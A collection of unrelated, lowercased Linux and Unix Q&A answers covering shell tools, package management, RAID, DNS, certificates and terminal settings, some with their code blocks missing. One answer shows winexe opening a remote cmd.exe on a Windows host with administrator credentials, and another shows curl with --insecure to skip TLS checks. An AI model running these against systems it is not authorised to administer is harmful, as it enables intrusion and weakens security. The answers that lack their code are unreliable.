solution in the txr language . the program consists almost entirely of txr 's embedded lisp dialect . the approach here is to keep each line from the file in a hash table . at any position in the file , we can ask the hash table , " at what positions have we seen this exact line before , if any ? " . if so , we can compare the file starting from that those position to the lines starting at the current position . if the match extends all the way from the previous position the current position , it means that we have a consecutive match : all the n lines from the previous position to just before the current line match the n lines starting at the current line . all we have to then is then find among all these candidate places the one that yields the longest match . ( if there are ties , only the first one is reported ) . hey look , there is a repeating two-line sequence in an xorg log file : $ txr longseq.txr /var/log/Xorg.0.log 2 line(s) starting at line 168  what is at line 168 ? these four lines : on the other hand , the password file is all unique : $ txr longseq.txr /etc/passwd no repeated blocks  the additional second argument can be used to speed up the program . if we know that the longest repeating sequence is , say , no more than 50 lines , then we can specify this . the program will then not look back farther than 50 lines . furthermore , the memory use is proportional to the range size , not to the file size , so we win in another way .
turns out there is a solution found in keychain . $ ps aux | grep "[f]nord"  by putting the brackets around the letter and quotes around the string you search for the regex , which says , " find the character ' f ' followed by ' nord ' . " but since you put the brackets in the pattern ' f ' is now followed by ' ] ' , so grep will not show up in the results list . neato !
editing linux mint fortunes ! ( mint 13 ) has some good information for how to tweak what " fortunes " are displayed . in specific , it appears they are stored in /usr/share/cowsay/cows ( as plain text , preformatted ) with .cow extension . there is more information in the link .
you are close , but confuse the different syntax for mappings and commands : commands take ex commands , so the : to go from normal mode to command-line mode is not necessary ( but does not hurt , neither ) . the ex command is executed automatically , do not append a &lt;CR&gt; . so , this should work : command! RootDirRubyOpen Explore ~/.rbenv/versions/2.0.0-p247  the netrw plugin intercepts the :e of a directory via autocmds ; but you can just skip that and use :Explore directly . of course , this requires that the netrw plugin is active and the :Explore actually works when typed ( which is a good troubleshooting step for commands and mappings ) .
there is no difference between sending mail via the mail command or via any other program . as such a mail send via mail ( 1 ) is not more nor less likely to be identified as spam . ( i would add that this is the default way in which many non-cron tasks send you their mail , but i have no evidence to back that up . ) as to avoid having your mail seen as spam : make sure that your mail does not look like spam . e.g. not just a single html link , not just a picture . no l33t spelling . valid origins . etc etc . non of these are specific to the mail command .
if you tell gnu sort to split the fields by a different character , a dash - in your case it is pretty easy to sort this : $ sort -n -t"-" -k1 -k2M -k3 file.txt  example reference sort field by date mm/dd/yyyy
i had the same question , but there was no appropriate software . i tried to build davl , but did not succeed in that . so i ended up writing my own tool . you can find it here : https://github.com/i-rinat/fragview use ctrl + mouse scroll to change map scale .
it looks to be caused by the vim plugin netrw . vim . you could remove the file and , if you do need that functionality , reinstall the plugin .
what is the difference between removing support for a feature that appears in the defaults by using -useflag in the make . conf file vs . not having a feature in the cumulative defaults at all and having nothing related to it either in the make . conf file ? it is more complex than that , the order of use flag as seen by portage are determined by USE_ORDER = "env:pkg:conf:defaults:pkginternal:repo:env.d" ( default , can be overriden in /etc/{,portage/}make.conf ; see man make.conf for more details ) which means that all these locations override what is set in latter mentioned locations in that variable . to simplify this down , your question is regarding pkginternal and repo here ; respectively the internal package use flags and the repository , you will notice here that the package can override the defaults in the repository . this happens when a package explicitly uses +flag or -flag syntax , in which case that is used in further consideration ; if however just flag without suffix is used , the default setting that came from the repository ( or env . d ) is used instead . if no default setting exists , it is disabled that default ; this makes sense , as the profiles enable things as well as that having every feature on by default would enable way too much . if you bubble this up ( passing along conf , which is /etc/{,portage/}make.conf ) ; the same continues to apply , a default setting not existing anywhere means the use flag is disabled . can an application sourced from the default profile be qualified in relation to a standard application compiled in one of the standard linux distributions ? ( is the default profile close to some " standard " or is it already a pretty much customized subset ? ) in a standard linux distribution you would get a package with a lot of features enabled ; however , on gentoo you get to choose which features you will want to enable . the most sane use flags a majority would want are online ; but beyond that , support for different kind of formats , protocols , features , . . . and so on you need to specifically turn it on . to get a better idea about this ; take a look at the use flags in emerge -pv media-video/vlc . to get a more detailed described list of this ; do emerge gentoolkit , then equery u media-video/vlc . on a side note , you will find some desktop related use flags enabled in the desktop profile ; as well as server related use flags enabled in the server profile , and so on . . . is it really an issue nowadays to select a no-multilib profile for the whole build ? no comment on this , you can try to ask for pro and cons on the forums ; i run a multilib profile to be on the safe side . i would say this only really makes sense if you run a system where you know that you will not need 32-bit applications ; you can note by the list of those that exist that there are no desktop or server specific ones present : thus choosing such profile would also make you lose the defaults desktop / server can provide ; however , the amount of defaults is rather limited , you can very well replicate them in your make . conf if you really believe you need a no-multilib profile for your workflow .
accessing files there are various ways to do this , but the simplest is probably to use nautilus . installation to access samba shares through nautilus install the gvfs-smb package , available in the official yum repositories . if it is not installed : $ sudo yum install gvfs-smb  then from nautilus , press ctrl + l and enter smb://servername/share in the location bar to access your share . the mounted share is likely to be present at /run/user/&lt;your_UID&gt;/gvfs in the filesystem . example after putting the following into nautilus ' location bar , smb://sam@bart/mp3s-1 . &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; after providing the appropriate credentials you will see the windows share , from the window 's cifs server . &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; note : in the above example , bart is the windows server , the user is sam , and the cifs share is /mp3s-1 . accessing processes to interact with processes on a windows system from a linux system you can use the tool winexe . it should be in most distros ' repos . examples see the list of processes / logged in users $ winexe --system -U 'DOMAIN\Administrator%password' //192.168.10.21 "tasklist /V"  start cmd . exe console $ winexe --system -U 'DOMAIN\Administrator%password' //192.168.10.21 cmd.exe  screenshot &nbsp ; &nbsp ; &nbsp ; references accessing windows console remotely from linux
bz2 is a type of data compression , it soesn ; t tell anything about the purpose of the files . pengine ( whatever that is , a game ? ) probably needs them . if the files are using up most of the space on var you could consider moving them to a partition with more space eg /home # umask 22 # mkdir /home/var_lib_overflow # mv /var/lib/pengine /home/var_lib_overflow/ # ln -s /home/var_lib_overflow/pengine /var/lib/  fhs suggests they could be " crash recovery files " from an editor in whih case they should go away by themselves .
suppose you start from /some/dir . by definition , a relative path changes when you change the current directory .
i have never installed chakra , my suggestion , install it on the same partition , but make sure that you tell chakra to format the partition , lose all data , etc .
binary file is pretty much everything that is not plain text , that is contains data encoded in any different way than text encoding ( ascii , utf-8 , or any of other text encodings , e.g. iso-8859-2 ) . a text file may be a plaintext document , like a story or a letter , it can be a config file , or a data file - anyway , if you use a plain text editor to open it , the contents are readable . a binary is any file that is not a text file ( nor " special " like fifo , directory , device etc . ) that may be a mp3 music . that may be a jpg image . that may be a compressed archive , or even a word processor document - while for practical purposes it is text , it is encoded ( written on disk ) as binary . you need a specific program to open it , to make sense of it - for a text editor the contents are a jumbled mess . now , in linux you will often hear " binaries " when referring to " binary executable files " - programs . this is because while sources of most programs ( written in high-level languages ) are plain text , compiled executables are binary . since there are quite a few compiled formats ( a . out , elf , bytecode . . . ) they are commonly called binaries instead of dwelling on what internal structure they have - from user 's point of view they are pretty much the same . now , . exe is just another of these compiled formats - one common to ms windows . it is just a kind of binaries , compiled and linked against windows api .
to kill all bash processes , belonging to root , i used the following script : for pid in $(pgrep -u 0 bash); do if [ "$pid" != "$$" ]; then kill -HUP "$pid"; fi done 
there are different ways of rating video edition software , and depending on which attribute ( features ? user-friendliness ? ) you want to focus on , the answer to your question will be different . assuming you mean " which open source video edition software is the most complete ( it terms of features ) " , then the answer is probably cinelerra . to get an idea of how it compares to other video edition software , i suggest you have a look at the appropriate wikipedia page .
if you want a quick and dirty solution , simply edit /usr/share/gnome-shell/theme/gnome-shell.css  of course this will likely get overwritten the next time you update your gnome-shell package . the cleaner ( but a bit more complex ) way is to create you own ( mini- ) theme : http://rlog.rgtti.com/2012/01/29/how-to-modify-a-gnome-shell-theme/
i also use ubuntu 12.04 , and i get this error : $ grep -r 'test' . &gt; tmp.txt grep: input file `./tmp.txt' is also the output  because redirection will be expand first , so tmp.txt is created in current directory before grep is executed , leading to error occurs . if i change tmp.txt to other path , like /tmp/tmp.txt , then it works normally . my grep version :
assuming you do not have device names containing spaces ( which are a pain when it comes to parsing the output of df ) : df -P | awk '+$5 &gt;= 80 {print}'  adapt the field number if you want to use your implementation 's df output format rather than the posix format .
your script changes directories as it runs , which means it will not work with a series of relative pathnames . you then commented later that you only wanted to check for directory existence , not the ability to use cd , so answers do not need to use cd at all . revised . using tput and colours from man terminfo: ( edited to use the more invulnerable printf instead of the problematic echo that might act on escape sequences in the text . )
http://sourceforge.net/projects/divfixpp/ was the solution . .
i think the error is pretty self explanatory . the ppa you are attempting to add does not provide packages for your particular version/release of mint . at least not at the ppa level , even though the packages may be completely compatible . take a look at this q and a on askubuntu , specifically this answer . there is a solution that you can try but it is not really the recommended approach for dealing with this particular issue : excerpt from this forum post : the error regarding distribution template is refering to the file "/etc/lsb-release " it should read something like . . . DISTRIB_ID=Ubuntu DISTRIB_RELEASE=11.10 DISTRIB_CODENAME=oneiric DISTRIB_DESCRIPTION="Ubuntu 11.10"  the ubuntu version depends on the version of mint you are using . you should be able to change the distrib_description to change the name of the os during grub boot but you can not change the rest without breaking the source . list distribution template .
you can use gpart to search for file systems on /dev/dm-2 . after that or even as an alternative you can create dm volumes without lvm using dmsetup directly . on my systems the first lv always starts at offset 384: dmsetup create restore-lv --table "0 25165824 linear /dev/dm-2 384"  the size is not important ( and usually wrong ) for the test . then you check whether there is a file system . for ext ? with dumpe2fs -h /dev/mapper/restore-lv  if that really was the position of the lv then dumpe2fs ( or the respective program for your file system type ) should tell you the size of the file system ( which usually is the same size as the lv ) : Block count: 53248 Block size: 1024  in this case the fs / lv size is 53248*1024=54525952 bytes ( 106496 sectors ) . so the correct dmsetup command would have been dmsetup create restore-lv1 --table "0 106880 linear /dev/dm-2 384"  and the next one is at 106496+384=106880: dmsetup create restore-lv --table "0 106880 linear /dev/dm-2 106880"  of course , if your lvs were fragmented then this will not work . but if it works then you can check whether lvcreate recreated the lvs correctly later .
this question is distro-agnostic , so if mention anything specific that you do not have , just use the equivalent on your side . i really recommend you buy an external for backups , trust me , losing your data is the worst . proceed at your own risk - but if you can not get one , here 's what you can do . what you need the size of your /home directory free space , more than the size of your /home directory disk partitioning tool , i recommend gparted what to do check the size of your /home directory ( the last result will be home total ) : du -h /home check if you have enough free space for the new partition : df -h install gparted sudo apt-get install gparted you need more free space than the size of your /home directory . if you do not have the free space , then you will not be able to create that new partition , and need to move your data onto an external anyway . if you have the space , use gparted to shrink your existing partition , and then create a new partition with the freed unallocated space . once your new partition is ready , note it is /dev/sdax ( use sudo fdisk -l to see this ) , and copy your /home files to it . using the partition in a new distro you mentioned installing another distro , if you plan to override your current distro , then during installation you should be asked to setup partitions . at that point you can specify this partition as /home , choose not to format it , and all will be well , you can skip this next section . if however you want your current distro to work with the new /home partition , follow this section : mount the partition in an existing distro we have to tell your os to use the partition as your new /home , we do this in fstab , but first let us find the uuid of this new partition : ls -l /dev/disk/by-uuid  cross reference your new partition 's /sdax and copy the uuid of it , mine looks like 3d866059-4b4c-4c71-a69c-213f0e4fbf32 . backup fstab : sudo cp /etc/fstab /etc/fstab.bak edit fstab : sudoedit /etc/fstab the idea is to add a new line that mounts the partition at /home . use your own uuid , not the one i post here ; ) save and restart , and test if the new partition mounts to /home . run df -h to list all mounted partitions , /home should now be in that list . notes it might be a good idea to familiarize yourself with fstab if you do not know it well . just take your time and think about each step . if you install a new distro , and use the same login name , your old /home files will automatically fall under your ownership . this is not a trivial topic to cover in one post , but i think i got most of it . : )
from the bash man page : and further : anything put into double parens becomes a math expression that bash will evaluate .
update : ( after comments ) try to modify in /etc/lightdm/lightdm.conf:  greeter-hide-users=true  in  greeter-hide-users=false  it is seems it is needed in all lightdm .conf files . it is possible you need to use lightdm-set-defaults [OPTION...] to fix it . the full options available are in the file : /usr/share/doc/lightdm/lightdm.conf.gz ( if installed ) . original : maybe you can try to add this ppa ppa:lightdm-gtk-greeter-team/daily and install the lightdm gtk+ greeter 1.6.0 . it seems that it solves automatically your problem you can see here . i find the ppa on this page of the launchpad blog posts . you can download directly from here good luck .
if you do not want to limit the scrolling region ( see my other answer ) , you can also use the carriage return to go back to the beginning of the line before printing the next line . there is an escape sequence that clears the rest of the line , which is necessary when the current line is shorter than the previous line .
your deluge user has /bin/false for their default shell - this is what su is running and passing the -c option to ( or running without any options when you simply do su deluge ) . you can use the --shell option to adduser to set a shell when creating the user . eg : sudo adduser --shell /bin/sh --disabled-password --system \ --home /var/lib/deluge --gecos "Deluge server" --group deluge  or use chsh to change the shell for an already created user : sudo chsh -s /bin/sh deluge  or you could use the --shell ( or -s ) option with su to override /etc/passwd: su deluge -s /bin/sh -c "flexget --test execute"  depending on what else your are doing with the user , /bin/bash might be a more appropriate shell to use .
you are running an old version of parted which still uses the blkrrpart ioctl to have the kernel reload the partition table , instead of the newer blkpg ioctl . blkrrpart only works on a disk that does not have any partitions in use , hence , the error about informing the kernel of the changes , and suggesting you reboot . update to a recent version of parted and you will not get this error , or just reboot for the changes to take affect , as the message said . depending on how old the util-linux package is on your system , you may be able to use partx -a or for more recent releases , partx -u to add the new partition without rebooting .
note that lilo is the default slackware bootloader , although you can find a grub package in the extra directory of your slackware dvd . the command that you want to use is mkinitrd ( housed in /sbin ) . you can use the following command to make an initrd.gz for your bootloader : mkinitrd -c -k 3.2.23 -m ext3 -f ext3 -r /dev/sdb3 the exact kernel version is set by -k . the mkinitrd man page has all the documentation and there is also a helpful bit of documentation in : /boot/README.initrd .
not a fix but a workaround . . . you have to go to " layout options " , open " miscellaneous compatibility options " and check " shift cancels caps lock " . now your alt + shift + tab will work as expected but your language switcher will be triggered by left shift + alt not by alt + left shift . it is practically the same key combo only the key pressing order is different .
the simple answer to this is that pretty much each application will handle it differently . also openssl and gnutls ( the most widely used certificate processing libraries used to handle signed certificates ) behave differently in their treatment of certs which also complicates the issue . also operating systems utilize different mechanisms to utilize " root ca " used by most websites . that aside , giving debian as an example . install the ca-certificates package : apt-get install ca-certificates  you then copy the public half of your untrusted ca certificate ( the one you use to sign your csr ) into the ca certificate directory ( as root ) : cp cacert.pem /usr/share/ca-certificates  and get it to rebuild the directory with your certificate included , run as root : dpkg-reconfigure ca-certificates  and select the ask option , scroll to your certificate , mark it for inclusion and select ok . most browsers use their own ca database , and so tools like certutil have to be used to modify their contents ( on debian that is provided by the libnss3-tools package ) . for example , with chrome you run something along the lines of : certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n "My Homemade CA" -i /path/to/CA/cert.file  firefox will allow you to browse to the certificate on disk , recognize it a certificate file and then allow you to import it to root ca list . most other commands such as curl take command line switches you can use to point at your ca ,  curl --cacert /path/to/CA/cert.file https://...  or drop the ssl validation altogether  curl --insecure https://...  the rest will need individual investigation if the ca-certificates like trick does not sort it for that particular application .
what you probably is want is pipestatus ( from man bash : )
the color palettes are all hard-coded so adding custom themes to gnome-terminal built-in prefs menu is not possible unless you are willing to patch the source code and recompile the application . one way of setting a custom color themes for your profile is via scripts . have a look at how solarize does it : gnome-terminal-colors-solarized note , though , that gconf is eol and future releases of gnome-terminal will use gsettings backend .
if you really want to encrypt a disk under openbsd , this can help .
your sources.list is broken - it is missing the " stable " part of the repository which contains the bulk of all debian packages . you have only added the " wheezy/updates " part which only contains updates for some packages from " stable " . it should instead probably look something like this ( generated with http://debgen.simplylinux.ch/ , assuming you are located in russia ) :
there is a nautilus ( gnome 's file manager ) extension for that : http://packages.debian.org/sid/nautilus-open-terminal that is the package for debian . you should look in the repository of your distribution for a similar package .
the file has probably been locked using file attributes . as root , do lsattr zzzzx.php  attributes a ( append mode ) or i ( immutable ) present would prevent your rm . if they are there , then chattr -ai zzzzx.php rm zzzzx.php  should delete your file .
in general there has to be some kind of protocol because typically it is not enough to just load a file into memory and jump at a specific location but you have to either pass additional arguments like kernel parameters , i.e. accessing memdisk arguments from dos . as this is hardware dependent ( arm is different than x86 for instance ) you have to find the correct information , see this article about booting arm or the linux/x86 boot protocol for some examples .
the system component that reacts to the connection of a removable device is udev , as mentioned by shw . even the udev tutorial can be a little daunting ; i will show you a couple of examples . there are two steps involved : associating a device file ( e . g . /dev/sdc ) with the hardware device , and mounting the device to access the filesystem . udev 's job is the first step , though you can tell it to run an external command such as mount . for known removable devices , i like to use a dedicated device name under /dev/removable ( that directory name is a personal convention ) . the following udev rules ( to be placed in /etc/udev/rules.d/my_removable_disks.rules ) create symbolic links with known names for two disks , both identified by a property of the filesystem on their partition 1: older versions of udev may need /udev/lib/vol_id -u %N1 ( for the uuid , -l for the label ) instead of the blkid call . there are more things you can match on , e.g. ATTRS{vendor}=="Yoyodine", ATTRS{serial}=="XYZZY12345PDQ97" ( instead of PROGRAM==\u2026, RESULT==\u2026 ) to match a device 's vendor and serial number . then you can use a line like this in /etc/fstab: /dev/removable/joe /media/joe vfat noauto,user  if you prefer an automatic mount , you can add something like , RUN="mkdir /media/foo &amp;&amp; mount /dev/removable/foo /media/foo" to the udev line . do not forget to umount /media/foo before unplugging .
the steps they provide effectively set up caching name service : zone "." { type hint; file "root.hints"; };  serve dns for the 192.168.1.0/24 and 127.0.0.0/8 netblock reverse dns zones : zone "0.0.127.in-addr.arpa" { type master; file "pz/127.0.0"; allow-update { none; }; };  and zone "1.168.192.in-addr.arpa" { type master; file "pz/192.168.1"; allow-update { none; }; };  these are both wrapped in views so that only hosts from those two netblocks can resolve the dns . it also hides the version of bind from remote queries : zone "." { type hint; file "/dev/null"; };  you can provide the same by adding :  127.0.0.1 localhost 192.168.1.1 localhost  to /etc/hosts and removing/stopping any exisiting bind services . provided that they allow dns queries out ( which they will have to if they want to allow dns recursion from the root hints zone , to provide a caching name server ) , then you can use an external dns provider ( such as google ) with :  echo "nameserver 8.8.8.8" &gt; /etc/resolv.conf  this should also be sufficient for apache to be to determine its hostname and save you the long winded process of creating a bind name server . [ edit ] the op has made these changes and still has issues . i suspect this is not related to the original issue , so will ask some additional questions . if dig &lt;domain-name&gt;. @8.8.8.8 is giving the correct details then your external dns is correct , and it most likely is internal ip config / routing / firewalls . does the output of ifconfig show interfaces with more than just 127.0.0.1 and 192.168.1.1 ? if it is just these , then something outside of your host nats your address to your external ip , and may also decide what you are allowed in terms of open ports . if global-ip is your external ip address and appears in this list , then you may have to edit the apache configuration to listen on that address as opposed to 192.168.1 . x . do you have something like iptables installed ? what does iptables -nvL INPUT show ? ( this has to be run as root , or via sudo ) . iptables may be blocking incoming/outgoing requests . [ edit 2 ] the op was interested in how dns works . a user on youtube has provided a basic dns 101 video . which stands out as illustrative and straight forward enough to get the basics of dns . if you really want to understand dns thoroughly the o'reilly " grashopper " book dns and bind 5th edition is an excellent resource and also will teach you how to use in in conjuction with bind .
you can not directly print the ascii codes by using the printf "%c" $i like in c language . you have to first convert the decimal value of i into its octal value and then you have to print it using using printf and putting \ in front of their respective octal values . eg . to print A , you have to convert the decimal 65 into octal i.e. 101 and then you have to print that octal value as : printf "\101\\n"  this will print A . so you have to modify it to : for i in `seq 32 127`; do printf \\$(printf "%o" $i);done;  but by using awk you can directly print like in c language awk 'BEGIN{for(i=32;i&lt;=127;i++)printf "%c",i}';echo 
see this wikia . com article for the exact thing you are tyring to do : http://vim.wikia.com/wiki/map_ctrl-s_to_save_current_or_new_files in a nutshell you need to do the following . 1 . add this to ~/.vimrc 2 . disable terminal 's interpretation of ctrl + s
i figured it out myself . i was wrong to assume the " device " option would need a device name . instead , a soruce ( or sink , depending what you are trying to achive ) name is needed . this for example gives me alsa access to an individual microphone handled by pulseaudio :
unfortunately your webcam is not uvc compatible , and thus is not supported by the uvideo driver in openbsd . you would need to port the pac7302 driver from linux to use this webcam .
" rebuilding " a newly added disk to a raid array or accessing a degraded array are signicantly close in term of stress on the disks . the difference here is more about the size of the data to read : 6 gb against just 1 gb . i would advise you to copy all you can while you can on that spare disk . the worst case scenario being that the dying disk dies before you are finishing the copy or during the raid rebuilding attempt . while trying to save files : you would end with some of your " non trivial " data saved while rebuilding the array : you would lose everything ( the choice in then obvious )
in su - username , the hyphen means that the user 's environment is replicated , i.e. the default shell and working directory are read from /etc/passwd , and any login config files for the user ( e . g . ~/.profile ) are sourced . in short , you pretty much get the same environment as if you logged in normally . ( though the new user may not own the terminal , causing programs like screen to fail . ) not using the hyphen , will cause you to more or less keep the environment of the user that invoked su , including leaving you in the same working directory , where you may not have permissions . su will not ask for a password if the root user invoked it , so if you first have used sudo ( or su ) to become root , you will not need a password to become any other user .
iptables can do this easily with the snat target : iptables -t nat -A POSTROUTING -j SNAT \ -o eth0 -p tcp --dport 80 --destination yp.shoutcast.com \ --to-source $STREAM_IP 
raid should only resync after a server crash or replacing a failed disk . it is always recommended to use a ups and set the system to shutdown on low-battery so that a resync will not be required on reboot . nut or acpupsd can talk to many upses and initiaite a shutdown before the ups is drained . if the server is resyncing outside of a crash , you probably have a hardware issue . check the kernel log at /var/log/kern.log or by running dmesg . i also recommend setting up mdadm to email the adminstrator and running smartd on all disk drives similarly set up to email the administrator . i receive an email about half the time before i see a failed disk . if you are having unavoidable crashes , you should enable a write-intent bitmap on the raid . this keeps a journal of where the disk is being written to and avoids a full re-sync on reboot . enable it with : mdadm -G /dev/md0 --bitmap=internal 
this might work for you ( gnu sed ) : sed -i '/^&gt;/s/\s.*//' file 
from zshbuiltins : -z push the arguments onto the editing buffer stack , separated by spaces . to output content of xsel to your command line : print -z $(xsel -op) 
if you want to execute a command and get the output use the line below d=`git log` in your script you have to change two two things . i have the correct script below # ! /bin/bash rep="*" for f in `ls -r $rep` ; do d=`git log $f| wc -l` c=$d echo $c done edit : the original correction is changing the quotes to backticks to make the output reach the d variable . in addition , the $rep should be inside the backticks with the ls , otherwise it will add the * at the end of the last file name processed .
you can try proxychains and tor
assuming your powertop is in /usr/sbin , you can use sudo /usr/sbin/powertop with no password . to do this you need to run visudo and append the followind line , substituting yourusername with the real one : yourusername ALL=(root) NOPASSWD: /usr/sbin/powertop 
what about rm -r a*/* ? this should solve your issue .
you have not specified your desired output format but from the things you have tried , it looks like you are not picky . this will produce correctly formatted , unwrapped html but it needs to be run on the actual man page file . so , first locate the man file you are interested in : $ man -w mmap /usr/share/man/man2/mmap.2.gz  them , run man2html on it : man2html /usr/share/man/man2/mmap2.2.gz &gt; mmap.html  or , simply zcat $(man -w mmap) | man2html &gt; mmap.html  the output looks like this : man2html was available in the debian repository , i installed it with sudo apt-get install man2html . once you have it in html , you can translate to other formats easily enough : actually , these will not work , they will wrap the line automatically again . man2html /usr/share/man/man1/grep.1.gz | html2ps &gt; grep.ps man2html /usr/share/man/man1/grep.1.gz | html2ps | ps2pdf14 - grep.man.pdf  `
also there is trinity desktop , that is based on kde 3.5 . you can install it on debian lenny , debian squeeze , ubuntu karmic to oneiric , rhel 5-6 , fedora 15 and slackware 12.2-13.1 .
an ip address is just a number . one that - as i am sure you know - uniquely identifies a computer on a network . but still just a number , which we will get back to . let 's take an example : 192.168.1.105 you will notice that the ip address is broken up into four parts : {192 , 168 , 1 , 105} . and you probably also know that each of those parts can have a value from 0-255 . it turns out that the numbers 0 . . 255 can be represented in 8 bits . so an ip address consists of four sections , and each section can have a value 0 . . 255 . this means that each section can be represented with 8 bits . with four of these sections , you have ( 4 sections ) * ( 8 bits/section ) = 32 bits . to represent the entire ip address . remember when we said that an ip address is just a number ? well , an ip is a 32-bit integer . for convenience , we write it as "192.168.1.105" but you could easily write it as 0xC0A80169 in binary , all 32 binary digits in their glory : 11000000101010000000000101101001 okay . so now your question : what does 192.168.1.105/24 mean ? it means that the first 24 bits of the ip address are the " subnet " . it means that the first 24 bits of items on your network are the same . as you add new computers , you only have 8 bits remaining ( remember , an ip is a 32-bit number ) for addressing new devices . because you have 8 bits worth of addressability , in this example , you may only add 255 devices . 110000001010100000000001 01101001 ------------------------ (subnet)  let 's break apart the subnet : 11000000 10101000 00000001 = 192 168 1  see ? same example with a /16 subnet : 192.168.1.105/16 1100000010101000 0000000101101001 ---------------- (subnet)  so in this case , every ip address begins with 192.168 - the first 16 bits of the ip address . and then we have 16 bits remaining for new devices . 16 bits = 65535 devices . so if you have a small subnet , you have a larger portion of internet addresses . mit owns a /8 subnet - that is , have a block ip addresses and they can add 2^24 devices . very cool !
i am not sure what you are trying to do . if you want to make a key combination perform an action , you can use xbindkeys . the companion program xbindkeys_config can help define bindings . if you want to act on existing windows , invoke a program such as xdotool or wmctrl . if you want to make a key combination simulate a sequence of key presses , try xmacro .
since i assume that your names do not always have these spaces , the easiest thing to do would be to simply remove the space if present :
assuming something went wrong with debian packages , try following : dpkg -l|grep -v ^ii  this lists all packages which are not installed properly . dpkg -P package  deinstall ( purge ) the affected package . dpkg -P --force-all package  try force if it is still resistant . dpkg --configure -a  try to refresh all still not configured packages . apt-get update  update always before you install new packages . apt-get install package  should now be ok .
more info from oscpu only adds that freebsd amd64 is not supported by this page .
as per comments rsync is a good tool to use . basic rsync usage simply mirrors a directory . for example : rsync -a --delete /source/dir /backup/dir  will make the backup directory match the source ; if there is stuff in the backup that is not in the source , it will be deleted ( --delete ) , and if there is stuff that is in both , it will be updated in the backup if the timestamp in the source is more recent ( i.e. . , the file has changed ) . note you can also use rsync via ssh if you do not have the remote directory locally mounted ( and the nas machine also runs an ssh server ) . rsync -a --delete user@ip:/source/dir /backup/dir  this requires that you keep the mirror directory on your backup machine . if you want rolling backups , you could then archive and compress this : tar -cjf backup.tb2 /source/dir  this can then be extracted with tar -xjf backup.tb2 . to prevent each backup from overwriting the last , you could use a timestamp : tar -cjf backup.`date +%m%d%y`.tb2 /source/dir  this will produce a filename with a mmddyy timestamp in it such as backup.030814.tb2 . so , that is a two line script you can execute daily via cron .
your arrays are not properly started . remove them from your running config with this : mdadm --stop /dev/md12[567]  now try using the autoscan and assemble feature . mdadm --assemble --scan  assuming that works , save your config ( assuming debian derivative ) with ( and this will overwrite your config so we make a backup first ) : mv /etc/mdadm/mdadm.conf /etc/mdadm/mdadm.conf.old /usr/share/mdadm/mkconf &gt; /etc/mdadm/mdadm.conf  you should be fixed for a reboot now , and it will auto assemble and start every time . if not , give the output of : mdadm --examine /dev/sd[bc]6 /dev/sd[bc]7  it'll be a bit long but shows everything you need to know about the arrays and the member disks of the arrays , their state , etc . just as an aside , it normally works better if you do not create multiple raid arrays on a disk ( ie , /dev/sd [ bc ] 6 and /dev/sd [ bc ] 7 ) seperately . rather create only one array , and you can then create partitions on your array if you must . but lvm is a much better way to partition your array most of the time .
here 's one way using gawk . run like : awk -f script.awk file  contents of script.awk: alternatively , here 's the one liner : results : you need to run dos2unix on your file first . i.e. : dos2unix Flussi0.csv  alternatively , change the record separator to \r\\n so that awk knows what a windows newline ending looks like . you can do this in the BEGIN block : BEGIN { FS=OFS=";" RS="\r\\n" }  results with the input file posted in the comments below :
the livecd 's are setup to specifically work with a read only system . when you copied the data via unetbootin , it merely just made a copy , the only difference is the boot medium . the filesystem and the os are still designed as if the medium is read-only , whether that is the case or not . the feature you are looking for is called " persistence " or " live cd persistence " , i was able to find a helpful post from a mint user on the mint forums on how to create a persistent install . if you dislike that option your best bet for alternative solutions would probably be : run mint installer and target the usb for installation create a separate small partition on the usb for saving some data ( will not help with system settings )
the dummy way : whereis -b crontab | cut -d' ' -f2 | xargs rpm -qf 
you can use command keyword in authorized_keys to restrict execution to one single command for particular key , like this : command="/usr/local/bin/mysync" ...sync public key...  update : if you specify a simple script as the command you may verify the command user originally supplied : #!/bin/sh case "$SSH_ORIGINAL_COMMAND" in /path/to/unison * $SSH_ORIGINAL_COMMAND ;; * echo "Rejected" ;; esac 
if the positions are not important , you can sort the files and then , perform a diff . you will have to save the sorted files in temporary area . sort file1 &gt; /tmp/file1 sort file2 &gt; /tmp/file2 diff /tmp/file1 /tmp/file2  you may also want to try vimdiff instead of diff .
from searching the linux kernel cross-reference , seems that no ( gives 0 results ) . however , from tresor ' s page , you can find a patch for kernel 3.6.2 and the documentation .
yes , but linux separates different sizes of icons into different directories instead of giving them different names . you will want to read the icon theme specification , which explains the directory layout , and the icon naming specification , which explains how the filenames should be chosen . to summarize , linux application icons would be something like : /usr/share/icons/&lt;theme-name&gt;/&lt;icon-size&gt;/apps/&lt;program-name&gt;.png 
the ^D character ( aka \04 or 0x4 ) is the default value for the eof special control character parameter of the terminal or pseudo-terminal driver in the kernel . that is the c_cc[VEOF] of the termios structure passed to the tcsets/tcgets ioctl one issues to the terminal device to affect the driver behaviour . the typical command that sends those ioctls is the stty command . to retrieve all the parameters : $ stty -a speed 38400 baud ; rows 58 ; columns 191 ; line = 0 ; intr = ^c ; quit = ^\ ; erase = ^ ? ; kill = ^u ; eof = ^d ; eol = &lt ; undef&gt ; ; eol2 = &lt ; undef&gt ; ; swtch = &lt ; undef&gt ; ; start = ^q ; stop = ^s ; susp = ^z ; rprnt = ^r ; werase = ^w ; lnext = ^v ; flush = ^o ; min = 1 ; time = 0 ; -parenb -parodd cs8 -hupcl -cstopb cread -clocal -crtscts -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke that eof parameter is only relevant when the terminal is in icanon mode . in that mode , the terminal driver ( not the terminal emulator ) implements a very simple line editor , where you can type backspace to erase a character , ctrl-u to erase the whole line . . . when an application reads from the terminal , it sees nothing until you press return at which point the read() returns the full line including the last CR or LF character ( by default the terminal driver also translates the CR to LF ) . now , if you want to send what you typed so far without pressing enter , that is where you can enter the eof character . upon receiving that character from the terminal emulator , the terminal driver submits the current content of the line , so that the application doing the read on it will receive it as is ( and it will not include a trailing LF or CR 